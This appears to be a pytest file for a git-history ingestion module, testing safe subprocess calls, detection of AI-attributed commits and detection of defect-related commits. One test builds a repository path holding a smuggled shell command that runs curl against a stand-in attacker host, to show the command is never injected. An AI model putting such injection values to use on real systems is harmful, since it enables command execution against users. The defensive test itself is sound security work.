"""Safety tests for git history subprocess invocation."""

from __future__ import annotations

from pathlib import Path

import pytest

from drift.ingestion.git_history import (
    _detect_ai_attribution,
    _is_defect_correlated,
    parse_git_history,
)


def test_parse_git_history_uses_arg_list_not_shell(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    calls: list[tuple[list[str], dict[str, object]]] = []

    class _Completed:
        returncode = 0
        stdout = ""

    def _fake_run(cmd: list[str], **kwargs: object) -> _Completed:
        calls.append((cmd, kwargs))
        return _Completed()

    monkeypatch.setattr("drift.ingestion.git_history.subprocess.run", _fake_run)

    parse_git_history(tmp_path, since_days=30)

    assert len(calls) == 1
    cmd, kwargs = calls[0]
    assert cmd[0] == "git"
    assert cmd[1] == "log"
    assert any(part.startswith("--since=") for part in cmd)
    assert any(part.startswith("--format=") for part in cmd)
    assert kwargs.get("shell", False) is False


def test_repo_path_with_shell_chars_is_never_injected_into_command(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    malicious_repo = tmp_path / "repo;curl attacker.invalid -s"
    malicious_repo.mkdir(parents=True)
    captured: dict[str, object] = {}

    class _Completed:
        returncode = 0
        stdout = ""

    def _fake_run(cmd: list[str], **kwargs: object) -> _Completed:
        captured["cmd"] = cmd
        captured["kwargs"] = kwargs
        return _Completed()

    monkeypatch.setattr("drift.ingestion.git_history.subprocess.run", _fake_run)

    parse_git_history(malicious_repo, since_days=7)

    cmd = captured["cmd"]
    kwargs = captured["kwargs"]
    assert isinstance(cmd, list)
    assert str(malicious_repo) not in " ".join(cmd)
    assert kwargs["cwd"] == str(malicious_repo)


def test_detect_ai_attribution_from_coauthor_marker() -> None:
    is_ai, confidence = _detect_ai_attribution(
        "Improve parser performance",
        ["GitHub Copilot"],
    )
    assert is_ai is True
    assert confidence == pytest.approx(0.95)


def test_detect_ai_attribution_tier1_message() -> None:
    is_ai, confidence = _detect_ai_attribution("Implement robust cache handling", [])
    assert is_ai is True
    assert confidence == pytest.approx(0.40)


def test_detect_ai_attribution_tier2_is_weak_signal_only() -> None:
    is_ai, confidence = _detect_ai_attribution("Fix parser bug", [])
    assert is_ai is False
    assert confidence == pytest.approx(0.15)


def test_defect_correlation_markers() -> None:
    assert _is_defect_correlated("hotfix: revert broken release") is True
    assert _is_defect_correlated("docs: update contribution guide") is False
